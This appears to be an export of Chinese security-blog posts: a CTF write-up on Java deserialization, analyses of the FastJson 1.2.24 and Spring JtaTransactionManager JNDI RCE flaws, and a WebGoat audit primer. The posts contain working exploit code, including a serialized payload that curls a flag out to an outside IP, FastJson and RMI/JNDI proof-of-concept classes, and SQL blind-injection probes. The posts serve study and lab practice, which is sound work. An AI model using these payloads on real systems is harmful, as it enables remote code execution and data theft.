array(&quot;success&quot;&#x3D;&gt;true);header(&quot;Content-Type:application&#x2F;json&quot;);echo json_encode($arr); 当前目录启动php -S 0:2333 EasySpringMVC给了war包，解压， tools目录下的两个类都实现了Serializable，其中Tools类还定义了readObject()方法，在反序列化时会自动触发。 ClientInfo类是用户信息类。 ClentInfoFilter类中先判断cookie中是否存在cinfo字段， 没有的话实例化一个ClientInfo， 1cinfo &#x3D; new ClientInfo(&quot;Anonymous&quot;, &quot;normal&quot;, ((HttpServletRequest)request).getRequestedSessionId()); base64编码，调用Tools.create()进行序列化，并存入cookie。否则进行反序列化 也就是说，我们可以通过控制cookie从而控制反序列化的类，这里readObject()已经被重写了 1(new ProcessBuilder((String[])((String[])obj))).start(); 那么我们可以通过重写Tools类的writeObject()方法，返回一个字符串数组，从而命令执行 payload 123456789101112131415161718192021222324252627package com.tools;import java.io.*;import java.util.Base64;public class Tools implements Serializable &#123; private static final long serialVersionUID = 1L; public static byte[] create(Object obj) throws Exception &#123; ByteArrayOutputStream bos = new ByteArrayOutputStream(); ObjectOutputStream outputStream = new ObjectOutputStream(bos); outputStream.writeObject(obj); return bos.toByteArray(); &#125; private void writeObject(ObjectOutputStream out) throws IOException &#123; String[] cmd = &#123;\"/bin/sh\",\"-c\",\"curl http://174.0.223.65:2333/`/readflag`\"&#125;; out.writeObject(cmd); &#125; public static void main(String[] args) throws Exception&#123; Base64.Encoder encoder = Base64.getEncoder(); Tools tools = new Tools(); byte[] bytes = Tools.create(tools); System.out.println(encoder.encodeToString(bytes)); &#125;&#125; 1rO0ABXNyAA9jb20udG9vbHMuVG9vbHMAAAAAAAAAAQMAAHhwdXIAE1tMamF2YS5sYW5nLlN0cmluZzut0lbn6R17RwIAAHhwAAAAA3QABy9iaW4vc2h0AAItY3QAKWN1cmwgaHR0cDovLzE3NC4wLjIyMy42NToyMzMzL2AvcmVhZGZsYWdgeA&#x3D;&#x3D; 一开始我不小心把下面的删了，导致一直失败。 private static final long serialVersionUID = 1L; 深入了解序列化writeObject、readObject、readResolve 参考链接： https://www.zhaoj.in/read-6407.html?tdsourcetag=s_pctim_aiomsg https://cjm00n.top/2020/02/29/V-N%E5%85%AC%E5%BC%80%E8%B5%9B2020-writeup/?tdsourcetag=s_pctim_aiomsg","categories":[],"tags":[{"name":"wp","slug":"wp","permalink":"https://glotozz.github.io/tags/wp/"}]},{"title":"Java反序列化漏洞-FastJson1.2.24","slug":"Java反序列化漏洞-FastJson1.2.24","date":"2020-03-01T05:47:37.000Z","updated":"2020-03-20T13:51:11.502Z","comments":true,"path":"2020/03/01/Java反序列化漏洞-FastJson1.2.24/","link":"","permalink":"https://glotozz.github.io/2020/03/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-FastJson1.2.24/","excerpt":"反序列化漏洞也是Java反序列化漏洞中比较经典的漏洞","text":"反序列化漏洞也是Java反序列化漏洞中比较经典的漏洞 &nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 FastJson介绍 漏洞分析 POC 总结 参考链接： FastJson介绍下载 12345678910111213141516171819&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;project xmlns&#x3D;&quot;http:&#x2F;&#x2F;maven.apache.org&#x2F;POM&#x2F;4.0.0&quot; xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot; xsi:schemaLocation&#x3D;&quot;http:&#x2F;&#x2F;maven.apache.org&#x2F;POM&#x2F;4.0.0 http:&#x2F;&#x2F;maven.apache.org&#x2F;xsd&#x2F;maven-4.0.0.xsd&quot;&gt; &lt;modelVersion&gt;4.0.0&lt;&#x2F;modelVersion&gt; &lt;groupId&gt;fastjson1224&lt;&#x2F;groupId&gt; &lt;artifactId&gt;test&lt;&#x2F;artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;&#x2F;version&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;&#x2F;groupId&gt; &lt;artifactId&gt;fastjson&lt;&#x2F;artifactId&gt; &lt;version&gt;1.2.24&lt;&#x2F;version&gt; &lt;&#x2F;dependency&gt; &lt;&#x2F;dependencies&gt;&lt;&#x2F;project&gt; 序列化 1234567891011121314151617import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.serializer.SerializerFeature;public class FJTest &#123; public static void main(String[] args) &#123; Cat cat = new Cat(); cat.setName(\"gqy\"); //序列化 String json = JSON.toJSONString(cat); System.out.println(json); //设置SerializerFeature.WriteClassName可写入类名 String json1 = JSON.toJSONString(cat, SerializerFeature.WriteClassName); System.out.println(json1); //反序列化 System.out.println(JSON.parseObject(json1, Cat.class).getName()); &#125;&#125; 注释掉setName()和setAge() 12345String s &#x3D; &quot;&#123;\\&quot;@type\\&quot;:\\&quot;Cat\\&quot;,\\&quot;name\\&quot;:\\&quot;gqy\\&quot;&#125;&quot;;Cat cat1 &#x3D; JSON.parseObject(s, Cat.class);System.out.println(cat1.getName()); &#x2F;&#x2F;nullCat cat2 &#x3D; JSON.parseObject(s, Cat.class, Feature.SupportNonPublicField);System.out.println(cat2.getName()); &#x2F;&#x2F;gqy 设置Feature.SupportNonPublicField即可支持对象类的private属性 新加一个属性properties,跟踪反序列化 12345678910111213141516171819202122232425import java.util.Properties;public class Cat &#123; private String name; private String age; private Properties properties; public String getName() &#123; return name; &#125; public Properties getProperties() &#123; System.out.println(\"getProperties\"); return properties; &#125; public String getAge() &#123; System.out.println(\"getAge\"); return age; &#125; public Cat() &#123; &#125;&#125; 12String s1 &#x3D; &quot;&#123;\\&quot;@type\\&quot;:\\&quot;Cat\\&quot;,\\&quot;name\\&quot;:\\&quot;gqy\\&quot;,\\&quot;properties\\&quot;:&#123;&#125;&#125;&quot;;Cat cat3 &#x3D; JSON.parseObject(s1, Cat.class, Feature.SupportNonPublicField); 结果为 12构造函数getProperties 漏洞分析漏洞触发点为 com.sun.org.apache.xalan.internal.xsltc.trax.Templates，但是这个包我在fastjson中没找到，却可以执行。 可以借助下面的网址查找jar https://www.findjar.com/ 在我jdk1.8.0._112的jre/lib/rt.jar中，也添加到libraries中即可 搜索getOutputProperties() 追踪Transformer 追踪getTransletInstance() 这里有一个实例化类，追踪defineTransletClasses() 从_bytecodes属性中加载类对象，并且上一步中要求这个对象继承AbstractTranslet 追踪ABSTRACT_TRANSLET常量为com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet和前面的强制类转化相照应 利用链 1234567891011JSON.parseObject...JavaBeanDeserializer.deserialze...FieldDeserializer.setValue...TemplatesImpl.getOutputPropertiesTemplatesImpl.newTransformerTemplatesImpl.getTransletInstance...Runtime.getRuntime().exec 构造我们需要的实例化对象 newInstance()会自动执行无参构造方法 123456789101112131415161718import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;public class Test extends AbstractTranslet &#123; public Test()&#123; Runtime.getRuntime().exec(\"calc\"); &#125; //继承AbstractTranslet需要重写下面两个方法 public void transform(DOM dom, SerializationHandler[] serializationHandlers) throws TransletException &#123; &#125; public void transform(DOM dom, DTMAxisIterator dtmAxisIterator, SerializationHandler serializationHandler) throws TransletException &#123; &#125;&#125; fastjson-remote-code-execute-poc 还有需要注意的一点，不能将类对象以字符流的形式传入，在JSONScanner中存在base64解码 POC1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859package person;import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.parser.Feature;import com.alibaba.fastjson.parser.ParserConfig;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import org.apache.commons.io.IOUtils;import org.apache.commons.codec.binary.Base64;import java.io.ByteArrayOutputStream;import java.io.File;import java.io.FileInputStream;import java.io.IOException;/** * Created by web on 2017/4/29. */public class Poc &#123; public static String readClass(String cls)&#123; ByteArrayOutputStream bos = new ByteArrayOutputStream(); try &#123; IOUtils.copy(new FileInputStream(new File(cls)), bos); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; return Base64.encodeBase64String(bos.toByteArray()); &#125; public static void test_autoTypeDeny() throws Exception &#123; ParserConfig config = new ParserConfig(); final String fileSeparator = System.getProperty(\"file.separator\"); final String evilClassPath = System.getProperty(\"user.dir\") + \"\\\\target\\\\classes\\\\person\\\\Test.class\"; String evilCode = readClass(evilClassPath); final String NASTY_CLASS = \"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\"; String text1 = \"&#123;\\\"@type\\\":\\\"\" + NASTY_CLASS + \"\\\",\\\"_bytecodes\\\":[\\\"\"+evilCode+\"\\\"],\" + \"'_name':'a.b',\" + \"'_tfactory':&#123; &#125;,\" + \"\\\"_outputProperties\\\":&#123; &#125;&#125;\\n\"; System.out.println(text1); //String personStr = \"&#123;'name':\"+text1+\",'age':19&#125;\"; //Person obj = JSON.parseObject(personStr, Person.class, config, Feature.SupportNonPublicField); Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField); //assertEquals(Model.class, obj.getClass()); &#125; public static void main(String args[])&#123; try &#123; test_autoTypeDeny(); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; 总结上面其实只是fastjson反序列化的一种利用方式，还有基于JDNI（设置lookup属性）、基于ClassLoader（ 构造className为一个特殊的字符串时，通过这个类加载器来实现对自定义类的加载 ）的利用方式。 支持jdk1.7，1.8 该poc只能运行在fastjson-1.2.22到fastjson-1.2.24版本区间，因为fastjson从1.2.22版本才开始引入SupportNonPublicField。 不过此种利用方式需要在解析json串时设置Feature.SupportNonPublicField，而业务通常在使用fastjson时往往会直接按照默认参数调用parseObject()方法，所以略为鸡肋。 参考链接： http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/","categories":[],"tags":[{"name":"java","slug":"java","permalink":"https://glotozz.github.io/tags/java/"}]},{"title":"Java反序列化漏洞-Spring RCE","slug":"Java反序列化漏洞-Spring RCE","date":"2020-02-29T01:38:56.000Z","updated":"2020-03-20T13:55:06.149Z","comments":true,"path":"2020/02/29/Java反序列化漏洞-Spring RCE/","link":"","permalink":"https://glotozz.github.io/2020/02/29/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-Spring%20RCE/","excerpt":"主要通过spring中的反序列化漏洞和FastJson反序列化漏洞学习java反序列化原理及利用","text":"主要通过spring中的反序列化漏洞和FastJson反序列化漏洞学习java反序列化原理及利用 &nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 基础知识 Spring反序列化漏洞 参考链接： 基础知识为什么会有序列化和反序列化? 利用反序列化将程序运行的对象状态以二进制形式储存与文件系统中，然后可以在另一个程序中对序列化后的对象状态数据进行反序列化恢复对象。 序列化需要满足的两个条件 该类必须实现java.io.Serializable接口。 该类的所有属性必须是可序列化的。如果有一个属性不是可序列化的，则该属性必须注明是短暂的。 反序列化代码举例 1234567891011121314151617181920212223242526272829303132333435import java.io.*;public class SerializeTest &#123; public static void main(String[] args) &#123; Test test = new Test(); test.name = \"gqy\"; test.age = \"18\"; try&#123; // 打开一个文件输入流 FileOutputStream fileOut = new FileOutputStream(\"F:\\\\IdeaProjects\\\\javadeserialization\\\\src\\\\test1.db\"); // 建立对象输入流 ObjectOutputStream out = new ObjectOutputStream(fileOut); //输出反序列化对象 out.writeObject(test); out.close(); fileOut.close(); System.out.println(\"Serialized data is saved!!\"); //反序列化提取对象 FileInputStream fileIn = new FileInputStream(\"F:\\\\IdeaProjects\\\\javadeserialization\\\\src\\\\test1.db\"); // 建立对象输入流 ObjectInputStream in = new ObjectInputStream(fileIn); // 读取对象 Test test1 = null; test1 = (Test) in.readObject(); in.close(); fileIn.close(); System.out.println(test1.name); test1.eat(); &#125;catch (IOException | ClassNotFoundException i)&#123; i.printStackTrace(); &#125; &#125;&#125; 查看下序列化后的数据，只能看到不完整的信息 反序列化漏洞demo 在Java反序列化中，会调用被反序列化的readObject方法，当readObject方法书写不当时就会引发漏洞。 PS：有时也会使用readUnshared()方法来读取对象，readUnshared()不允许后续的readObject和readUnshared调用引用这次调用反序列化得到的对象，而readObject读取的对象可以。 1234567891011121314151617181920212223242526272829303132import java.io.*;public class test&#123; public static void main(String args[]) throws Exception&#123; UnsafeClass Unsafe = new UnsafeClass(); Unsafe.name = \"hacked by ph0rse\"; FileOutputStream fos = new FileOutputStream(\"object\"); ObjectOutputStream os = new ObjectOutputStream(fos); //writeObject()方法将Unsafe对象写入object文件 os.writeObject(Unsafe); os.close(); //从文件中反序列化obj对象 FileInputStream fis = new FileInputStream(\"object\"); ObjectInputStream ois = new ObjectInputStream(fis); //恢复对象 UnsafeClass objectFromDisk = (UnsafeClass)ois.readObject(); System.out.println(objectFromDisk.name); ois.close(); &#125;&#125;class UnsafeClass implements Serializable&#123; public String name; //重写readObject()方法 private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException&#123; //执行默认的readObject()方法 in.defaultReadObject(); //执行命令 Runtime.getRuntime().exec(\"calc.exe\"); &#125;&#125; 主要是这里的重写了readObject() 漏洞起源 重写ObjectInputStream对象的resolveClass方法中的检测可被绕过。 使用第三方的类进行黑名单控制。虽然Java的语言严谨性要比PHP强的多，但在大型应用中想要采用黑名单机制禁用掉所有危险的对象几乎是不可能的。因此，如果在审计过程中发现了采用黑名单进行过滤的代码，多半存在一两个‘漏网之鱼’可以利用。并且采取黑名单方式仅仅可能保证此刻的安全，若在后期添加了新的功能，就可能引入了新的漏洞利用方式。所以仅靠黑名单是无法保证序列化过程的安全的。 基础库中隐藏的反序列化漏洞 2015年由黑客Gabriel Lawrence和Chris Frohoff发现的‘Apache Commons Collections’类库直接影响了WebLogic、WebSphere、JBoss、Jenkins、OpenNMS等大型框架。直到今天该漏洞的影响仍未消散。存在危险的基础库： 123456789101112commons-fileupload 1.3.1commons-io 2.4commons-collections 3.1commons-logging 1.2commons-beanutils 1.9.2org.slf4j:slf4j-api 1.7.21com.mchange:mchange-commons-java 0.2.11org.apache.commons:commons-collections 4.0com.mchange:c3p0 0.9.5.2org.beanshell:bsh 2.0b5org.codehaus.groovy:groovy 2.3.9org.springframework:spring-aop 4.1.4.RELEASE Spring反序列化漏洞首先需要了解JAVA体系中的RMI以及JNDI RMI（Remote Method Invocation） 即Java远程方法调用，一种用于实现远程过程调用的应用程序编程接口，常见的两种接口实现为JRMP（Java Remote Message Protocol，Java远程消息交换协议）以及CORBA。 JNDI (Java Naming and Directory Interface)是一个应用程序设计的API，为开发人员提供了查找和访问各种命名和目录服务的通用、统一的接口。JNDI支持的服务主要有以下几种：DNS、LDAP、 CORBA对象服务、RMI等。 简单说就是RMI注册的服务可以让JNDI应用程序来访问。 JNDI RCE漏洞产生的原因就在于当我们在注册RMI服务时，可以指定codebase url，也就是远程要加载类的位置，设置该属性可以让JDNI应用程序在加载时加载我们指定的类 ( 例如：http://www.iswin.org/xx.class) ，这里还有一个比较重要的点，也是触发恶意代码的点，当JNDI应用程序通过lookup(rmi服务的地址)调用指定codebase url上的类后，会调用被远程调用类的构造方法，所以如果我们将恶意代码放在被远程调用类的构造方法中时，漏洞就会触发。 RMI测试demo 1234567Registry registry &#x3D; LocateRegistry.createRegistry(1999);&#x2F;&#x2F; 设置code url 这里即为http:&#x2F;&#x2F;http:&#x2F;&#x2F;127.0.0.1:8000&#x2F;&#x2F;&#x2F; 最终下载恶意类的地址为http:&#x2F;&#x2F;127.0.0.1:8000&#x2F;ExportObject.classReference reference &#x3D; new Reference(&quot;ExportObject&quot;, &quot;ExportObject&quot;, &quot;http:&#x2F;&#x2F;127.0.0.1:8000&#x2F;&quot;);&#x2F;&#x2F; Reference包装类ReferenceWrapper referenceWrapper &#x3D; new ReferenceWrapper(reference);registry.bind(&quot;Object&quot;, referenceWrapper); 1999端口注册了RMI服务，设置code url为http://http://127.0.0.1:8000/，实际类加载位置为http://127.0.0.1:8000/ExportObject.class，绑定了Object，JNDI调用的地址为http://127.0.0.1:8000/Object 控制了恶意类ExportObject就能RCE JNDI测试demo Persion类 1234567891011121314151617181920212223242526272829303132333435363738import java.io.IOException;import java.io.Serializable;import java.rmi.Remote;public class Person implements Remote,Serializable &#123; private static final long serialVersionUID = 1L; private String name; private String password; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public String getPassword() &#123; return password; &#125; public void setPassword(String password) &#123; this.password = password; &#125; public String toString()&#123; return \"name:\"+name+\" password:\"+password; &#125; private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException&#123; //执行默认的readObject()方法 in.defaultReadObject(); //执行命令 Runtime.getRuntime().exec(\"calc.exe\"); &#125;&#125; 服务端rmi为例 1234567891011121314151617181920212223242526272829303132333435363738import java.rmi.registry.LocateRegistry;import javax.naming.Context;import javax.naming.InitialContext;public class Test3 &#123; public static void initPerson() throws Exception&#123; //配置JNDI工厂和JNDI的url和端口。如果没有配置这些信息，会出现NoInitialContextException异常 //配置rmi LocateRegistry.createRegistry(3001); System.setProperty(Context.INITIAL_CONTEXT_FACTORY, \"com.sun.jndi.rmi.registry.RegistryContextFactory\"); System.setProperty(Context.PROVIDER_URL, \"rmi://localhost:3001\"); ////初始化 InitialContext ctx = new InitialContext(); //实例化person对象 Person p = new Person(); p.setName(\"hello\"); p.setPassword(\"jndi\"); //person对象绑定到JNDI服务中，JNDI的名字叫做：person。 ctx.bind(\"person\", p); ctx.close(); &#125; public static void findPerson() throws Exception&#123; //因为前面已经将JNDI工厂和JNDI的url和端口已经添加到System对象中，这里就不用在绑定了 InitialContext ctx = new InitialContext(); //通过lookup查找person对象 Person person = (Person) ctx.lookup(\"person\"); //打印出这个对象 System.out.println(person.toString()); ctx.close(); &#125; public static void main(String[] args) throws Exception &#123; initPerson(); findPerson(); &#125;&#125; 本来是读取person类的信息，在person类中加上了readObject()方法，成功RCE Jndi注入产生的原因 1、lookup参数可控。 2、InitialContext类及他的子类的lookup方法允许动态协议转换 3、lookup查找的对象是Reference类型及其子类 4、当远程调用类的时候默认会在rmi服务器中的classpath中查找，如果不存在就会去url地址去加载类。如果都加载不到就会失败。 跟进lookup() 跟进getURLOrDefaultInitCtx(name) 即使一开始设置了Context，也是可以重写为我们传入的lookup()的参数 举例 12345678&#x2F;&#x2F; Create the initial contextHashtable env &#x3D; new Hashtable();env.put(Context.INITIAL_CONTEXT_FACTORY,&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;);env.put(Context.PROVIDER_URL, &quot;rmi:&#x2F;&#x2F;secure-server:1099&quot;);Context ctx &#x3D; new InitialContext(env);&#x2F;&#x2F; Look up in the local RMI registryObject local_obj &#x3D; ctx.lookup(&lt;attacker controlled&gt;); Spring RCE Spring RCE形成的主要原因是 Spring框架的spring-tx-xxx.jar中的org.springframework.transaction.jta.JtaTransactionManager 存在一个readObject方法。当执行对象反序列化的时候，会执行lookup操作，导致了jndi注入，可以导致远程代码执行问题 环境搭建+POC mvn install出现报错[ERROR] 不再支持源选项 5。请使用 6 或更高版本。 pom.xml中增加maven编译的jdk版本设置 123456789&lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;&#x2F;groupId&gt; &lt;artifactId&gt;maven-compiler-plugin&lt;&#x2F;artifactId&gt; &lt;version&gt;3.3&lt;&#x2F;version&gt; &lt;configuration&gt; &lt;source&gt;1.8&lt;&#x2F;source&gt; &lt;target&gt;1.8&lt;&#x2F;target&gt; &lt;&#x2F;configuration&gt;&lt;&#x2F;plugin&gt; 发现还是没用,Terminal里面的java版本始终是java11 解决办法：help–&gt;find action ，输入switch boot jdk，切换成自己的jdk即可 把jar包下载下来，分析一下源码 利用idea自带的反编译，add as library，注意最好添加为Global，否则可能会找不到类 org.springframework.transaction.jta.JtaTransactionManager 当一个类被反序列化时会调用该类的readObject()方法，跟进initUserTransactionAndTransactionManager()方法 跟进lookupUserTransaction() 调用JndiTemplate.lookup()，追踪lookup() 跟进lookup() 总结一下调用链 JtaTransactionManager-&gt;readObject()-&gt;initUserTransactionAndTransactionManager() -&gt;lookupUserTransaction(this.userTransactionName)，这里的userTransactionName是我们可控的（setUserTransactionName()），最终触发 JndiTemplate的lookup(userTransactionName)触发RCE。我们需要注册一个rmi服务，并提供恶意类。 漏洞实现 客户端demo 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071package client.src.main.java;import java.io.IOException;import java.io.ObjectOutputStream;import java.net.InetSocketAddress;import java.net.Socket;import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;import javax.naming.Reference;import org.springframework.transaction.jta.JtaTransactionManager;import com.sun.jndi.rmi.registry.ReferenceWrapper;import com.sun.net.httpserver.HttpServer;/*** * * @author admin@iswin.org * @time 2016.1.24 */@SuppressWarnings(\"restriction\")public class ExploitClient &#123; /*** * 启动http服务器，提供下载远程要调用的类 * * @throws IOException */ public static void lanuchCodebaseURLServer() throws IOException &#123; System.out.println(\"Starting HTTP server\"); HttpServer httpServer = HttpServer.create(new InetSocketAddress(8000), 0); httpServer.createContext(\"/\", new HttpFileHandler()); httpServer.setExecutor(null); httpServer.start(); &#125; /*** * 启动RMI服务 * * @throws Exception */ public static void lanuchRMIregister() throws Exception &#123; System.out.println(\"Creating RMI Registry\"); Registry registry = LocateRegistry.createRegistry(1999); // 设置code url 这里即为http://http://127.0.0.1:8000/ // 最终下载恶意类的地址为http://127.0.0.1:8000/ExportObject.class Reference reference = new Reference(\"ExportObject\", \"ExportObject\", \"http://127.0.0.1:8000/\"); // Reference包装类 ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference); registry.bind(\"Object\", referenceWrapper); &#125; /*** * 发送payload * * @throws Exception */ public static void sendPayload() throws Exception &#123; // jndi的调用地址 String jndiAddress = \"rmi://127.0.0.1:1999/Object\"; // 实例化JtaTransactionManager对象，并且初始化UserTransactionName成员变量 JtaTransactionManager object = new JtaTransactionManager(); object.setUserTransactionName(jndiAddress); // 发送构造好的payload Socket socket = new Socket(\"127.0.0.1\", 9999); System.out.println(\"Sending object to server...\"); ObjectOutputStream objectOutputStream = new ObjectOutputStream(socket.getOutputStream()); objectOutputStream.writeObject(object); objectOutputStream.flush(); socket.close(); &#125; public static void main(String[] args) throws Exception &#123; lanuchCodebaseURLServer(); lanuchRMIregister(); sendPayload(); &#125;&#125; 服务端 123456789101112131415161718192021222324252627package server.src.main.java;import java.io.*;import java.net.*;public class ExploitableServer &#123; public static void main(String[] args) &#123; try &#123; int port = 9999; ServerSocket serverSocket = new ServerSocket(port); System.out.println(\"Server started on port \"+serverSocket.getLocalPort()); while(true) &#123; Socket socket=serverSocket.accept(); System.out.println(\"Connection received from \"+socket.getInetAddress()); ObjectInputStream objectInputStream = new ObjectInputStream(socket.getInputStream()); try &#123; Object object = objectInputStream.readObject(); System.out.println(\"Read object \"+object); &#125; catch(Exception e) &#123; System.out.println(\"Exception caught while reading object\"); e.printStackTrace(); &#125; &#125; &#125; catch(Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; payload 123456789101112131415import sun.awt.windows.ThemeReader;public class ExportObject &#123; public ExportObject() &#123; try &#123; while(true) &#123; System.out.println(\"running injected code...\"); Runtime.getRuntime().exec(\"calc.exe\"); Thread.sleep(1000); &#125; &#125; catch(Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; 切换java版本为1.8.0_112，成功 不过这只是模拟了漏洞的触发过程，客户端也就是攻击端，开个http服务8000，注册rmi服务到8000上，并绑定恶意类。然后开个socket服务发送payload到9999端口，这里的payload是就是将JtaTransactionManager反序列化，并设置object.setUserTransactionName(jndiAddress);。String jndiAddress = &quot;rmi://127.0.0.1:1999/Object&quot;;，实际查找位置为前面rmi绑定的http://127.0.0.1:8000/Object。 服务端就是开个socket服务从9999端口接受数据，并进行反序列化，自动触发readobject()，然后最终触发lookup()，jndi访问我们注册的rmi服务，触发恶意类的构造函数。 利用条件 1、存在接口进行序列化操作 2、访问对象可以出网 3、目标对象中的CLASSPATH存在Sping-tx-xxx.jar 总结 Spring-tx-xx.jar文件不是中间件的默认组件，所以，该漏洞就比较鸡肋 。 实际工程中可能会存在将缺陷jar文件放在中间件的类加载器中的情况， 即所有应用都可以访问这个jar，那么漏洞就可以利用 PS：本来想把Fastjson反序列化漏洞也写在这里的，但是防止篇幅过长，另写一篇🤦‍♂️ 参考链接： https://xz.aliyun.com/t/2041 https://www.freebuf.com/vuls/115849.html https://www.iswin.org/2016/01/24/Spring-framework-deserialization-RCE-%E5%88%86%E6%9E%90%E4%BB%A5%E5%8F%8A%E5%88%A9%E7%94%A8/","categories":[],"tags":[{"name":"java","slug":"java","permalink":"https://glotozz.github.io/tags/java/"}]},{"title":"java审计入门","slug":"java审计入门","date":"2020-02-28T00:48:22.000Z","updated":"2020-03-02T07:36:52.558Z","comments":true,"path":"2020/02/28/java审计入门/","link":"","permalink":"https://glotozz.github.io/2020/02/28/java%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8/","excerpt":"开始学java🏃‍♀️","text":"开始学java🏃‍♀️ &nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 准备工作 WebGoat 8 开始审计 SqlInjection 参考链接： 一般面试都会问到java漏洞了解嘛，会分析🐴，但我一般都是利用现成工具或者exp。趁还没开学时间比较多，学习一下java代码审计。 准备工作安装 运行java程序：先编译a.java=&gt;a.class，因此.class结尾的字节码文件需要反编译，工具我一般用jadx java平台：java se，java ee，java me，主要学习第二个web服务 常见的java服务器： Tomcat、Weblogic、JBoss、GlassFish ，主要学习Tomcat Tomcat目录结构 Tomcat部署源码 javapms为例 以SpringMVC+Spring+Hibernate+Freemarker+Html5+jQuery为技术核心架构 IDEA 导入项目并添加tomcat配置 IDEA调试功能 当前项目结构不太懂，不知道如何下放断点，跳过 Maven-项目管理和构建工具 Maven是一种自动构建项目的方式，可以帮助我们自动从本地和远程仓库拉取关联jar包。 部署WebGoat为例，导入项目 完成之后background就开始下载，但是速度 Fortify 代码审计工具 暂时先也不用 WebGoat 8 WebGoat8是基于Spring boot框架开发,故意不安全的Web应用程序，旨在教授Web应用程序安全性课程。 需要的环境：java 11、Maven &gt; 3.2.1、IDEA 安装 1234git clone https:&#x2F;&#x2F;github.com&#x2F;WebGoat&#x2F;WebGoat.gitcd WebGoatmvn clean package -Dmaven.test.skip&#x3D;truemvn -pl webgoat-server spring-boot:run -Dmaven.test.skip&#x3D;true 因为我有个包下载失败了就跳过这个包 最后是如下的界面 import WebGoat到IDEA 进行代码查看及调试 发现已经配置好了 组件安全 也暂时跳过 Dependency-Check是OWASP（Open Web Application Security Project）的一个实用开源程序 。 项目地址以及参考教程 开始审计第一个页面是登录，登录是很容易存在漏洞的功能点之一。 没学过Spring boot框架，既然路由是/login，全局搜索login 找到org/owasp/webgoat/WebSecurityConfig.java 大致能看懂，但是漏洞看不出来==，先看下面这个类似认证的方法 查阅AuthenticationManagerBuilder auth ，允许轻松构建内存身份验证，LDAP身份验证，基于JDBC的身份验证，添加UserDetailsService以及添加AuthenticationProvider。 那么追踪userDetailsService 1private final UserService userDetailsService; 追踪UserService 和文章一样，userRepository.findByUsername(username)猜测是数据库查询， 追踪 是个接口，追踪 还是个接口，实现了更多方法，继续追踪，最后到Repository接口我也没找到实现这个接口的代码 这是个导入的包，看来已经高度集成，那么只需要知道其用法即可 [Spring Boot 揭秘与实战（二）] 实体对象 创建一个 Author 实体，真实的表名是 t_author，包含 id（自增主键）、 realName、 nickname 字段。 123456789101112131415@Entity@Table(name &#x3D; &quot;t_author&quot;)public class Author&#123; @Id @GeneratedValue(strategy &#x3D; GenerationType.AUTO) private Long id; @Column(name&#x3D;&quot;real_name&quot;) private String realName; @Column(name&#x3D;&quot;nick_name&quot;) private String nickName; &#x2F;&#x2F; SET和GET方法&#125; DAO相关 1234567public interface AuthorRepository extends JpaRepository&lt;Author, Long&gt; &#123; List&lt;Author&gt; findAll(); @Query(&quot;from Author where id &#x3D; :id&quot;) Author findAuthor(@Param(&quot;id&quot;) Long id);&#125; 这个from的是对象名，感觉类似于预编译，能防止sql注入 SpringBoot查询findBy规则 所以上面的类似于fileByUsername()类似于 1... where username&#x3D;?1 既然不存在sql注入，继续回去看 createUser()后，在之前public WebGoatUser loadUserByUsername(String username)的return webGoatUser后打上断点，并执行下一步，跳转如下 在进行比较。 注册功能 全局搜索路由/registration 追踪validate() 之后就是addUser()，跟踪下发现也是利用封装好的save()插入数据库 说好的不安全呢？？原来是要登录进去才开始实验 SqlInjection全局搜索sqlinjection就能找到源码 查询的数据中department=Marketing才有回显 尝试联合注入 1select * from employees where department&#x3D;&#39;Marketing&#39; union select 1,2,3,&#39;Marketing&#39;,5,database() Something went wrong，应该是不支持这种语法，追踪下数据库 不知道是啥类型，测试发现盲注也不行，和mysql不是一个语法的。。这关似乎只是熟悉sql语法 challenge-9 sql语句已经给了，简单的拼接。。 查看挑战org/owasp/webgoat/sql_injection/advanced/SqlInjectionChallenge.java 明显问题出在checkUserQuery，是个布尔盲注，如果是mysql就不写了，这里写个脚本试试 这里用--可以注释 substr()可以截取字符串 构造下面的发现回显不同 12tom&#39;and &#39;1&#39;&#x3D;&#39;0&#39; -- tom&#39;and &#39;1&#39;&#x3D;&#39;1&#39; -- 是put请求，json格式返回 HTTP协议中PUT和POST使用区别 